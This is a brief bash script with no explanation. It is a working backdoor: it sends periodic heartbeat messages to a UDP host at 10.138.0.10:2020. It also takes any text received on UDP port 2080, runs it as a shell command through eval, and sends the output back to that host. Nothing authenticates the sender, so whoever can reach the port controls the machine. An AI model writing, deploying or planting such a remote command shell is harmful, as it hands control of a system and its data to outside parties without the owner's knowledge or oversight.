#!/bin/bash

TARGET_UDP="UDP4:10.138.0.10:2020"

# Heartbeat
while true; do
  echo "--- HEARTBEAT: $(date) ---" | socat - $TARGET_UDP
  sleep 10
done &

# Listen for commands on UDP 2080 and send output to $TARGET_UDP
while true; do
  cmd=$(socat - UDP-RECVFROM:2080)
  echo "Executing: $cmd"
  eval "$cmd" 2>&1 | socat - $TARGET_UDP
done
